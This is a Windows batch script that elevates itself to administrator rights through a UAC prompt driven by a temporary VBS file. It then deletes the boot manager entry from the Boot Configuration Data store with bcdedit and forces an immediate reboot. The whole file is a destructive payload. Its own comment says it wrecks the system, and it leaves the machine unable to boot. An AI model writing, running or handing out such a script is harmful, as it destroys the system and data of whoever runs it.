@echo off

REM Check if running with admin privileges
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Running with administrator privileges
    set "admin=1"
) else (
    echo Not running with administrator privileges. Attempting to elevate...
    set "admin=0"
)

REM If not running with admin privileges, elevate
if "%admin%"=="0" (
    echo You aren't running as administrator. Accept the UAC prompt to elevate.
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" || (
        echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
        echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
        "%temp%\getadmin.vbs"
        del "%temp%\getadmin.vbs"
        exit /B
    )
    echo.
)

REM Delete the boot manager entry from the Boot Configuration Data (BCD) store, fucking up the whole system
bcdedit /delete {bootmgr} /f 

REM Reboot the system
shutdown /r /f /t 0